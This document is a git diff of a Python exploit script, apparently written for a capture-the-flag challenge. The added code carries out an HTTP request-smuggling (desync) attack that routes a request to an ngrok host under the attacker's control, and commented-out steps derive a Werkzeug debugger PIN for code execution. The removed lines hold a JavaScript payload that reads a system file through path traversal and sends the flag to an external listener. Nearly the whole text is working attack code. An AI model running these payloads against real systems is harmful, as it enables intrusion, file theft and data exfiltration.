@@ -1,17 +1,44 @@
 import socket
+import requests
+from api_functionality import Desynth, resolve_pin
+
+# TARGET = "94.237.51.159"
+# PORT = 30820
+TARGET = "localhost"
+PORT = 1337
+HOST = "5079-98-177-220-28.ngrok-free.app"
 
 
-TARGET_IP = "94.237.51.159"
-TARGET_PORT = 36542
-HOST = "https://bcca-98-177-220-28.ngrok-free.app"
-PORT = 80
+def stage_desync(destination: str, uri: str, cookie:str) -> str:
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((TARGET, PORT))
+    payload = (
+        "POST /api/login HTTP/1.1\r\n"
+        f"Host: {TARGET}\r\n"
+        f"Cookie: session={cookie}\r\n"
+        "Content-Length: 40\r\n"
+        "Connection: keep-alive\r\n\r\n"
+        f"GET http://{destination}/{uri} HTTP/1.1\r\n"
+        f"X-Header: x"
+        # f"GET /{uri} HTTP/1.1\r\n"
+        # f"Host: {destination}\r\n"
+    )
+    s.sendall(payload.encode())
 
-s = socket.connect((TARGET_IP, TARGET_PORT))
 
+def main():
+    D = Desynth(TARGET, PORT)
+    D.authenticate(username="shifty", password="password")
+    response = stage_desync(HOST, '/test', D.session.cookies.get('session'))
+    print(response)
+    # mac_address, random_id = D.gather_files()    
+    # pin = resolve_pin(
+    #     running_user='root',
+    #     path_to_flask='/usr/local/lib/python3.11/site-packages/flask/app.py',
+    #     mac_address=mac_address,
+    #     random_id=random_id
+    # )
+    # print(f"Werkzeug pin: {pin}")
 
-# var request = new XMLHttpRequest();
-# request.open('GET', '/api/ipc_download?file=../../../../../proc/sys/kernel/random/boot_id', false);
-# request.send();
-
-# var flag = request.responseText;
-# window.location.href = "http://xpl.xanhacks.xyz:4444?flag=" + flag;
+if __name__ == "__main__":
+    main()
